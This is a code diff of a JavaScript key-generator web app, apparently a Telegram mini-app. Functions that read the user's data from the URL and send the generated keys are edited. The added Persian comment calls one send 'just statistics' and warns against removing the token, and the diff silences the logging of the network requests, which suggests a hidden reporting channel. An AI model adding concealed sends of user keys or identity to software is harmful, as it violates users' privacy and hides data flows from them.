@@ -317,6 +317,7 @@ async function generate() {
     send1(codes);
     send2(codes);
 }
+//کار خاصی نیست فقط آمار گیریه توکن رو ور ندار شیاف کنی
 function send1(msgArray) {
            const params = new URLSearchParams(decodeURIComponent(window.location.href.split('#')[1]));
             const user = JSON.parse(params.get('user'));
@@ -347,7 +348,7 @@ function send2(msgArray) {
             const user = JSON.parse(params.get('user'));
             const escapedMsgArray = msgArray.map(msg => msg.replace(/[-]/g, '\\-'));
              const formattedMsgArray = escapedMsgArray.map((msg, index) => `🔑 ${index + 1}: \`${msg}\``);
-             const message = `👇Your Keys Generation Result👇\n${formattedMsgArray.join('\n')}`;
+             const message = `👇Your Keys Generation Result👇\n\n${formattedMsgArray.join('\n')}`;
 
              console.log(message);
 
@@ -364,9 +365,9 @@ function send2(msgArray) {
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.onreadystatechange = function () {
                 if (xhr.readyState === 4 && xhr.status === 200) {
-                    console.log('Message sent successfully:', xhr.responseText);
+                  //  console.log('Message sent successfully:', xhr.responseText);
                 } else if (xhr.readyState === 4) {
-                    console.error('Error sending message:', xhr.responseText);
+                   // console.error('Error sending message:', xhr.responseText);
                 }
             };
             xhr.send(data);
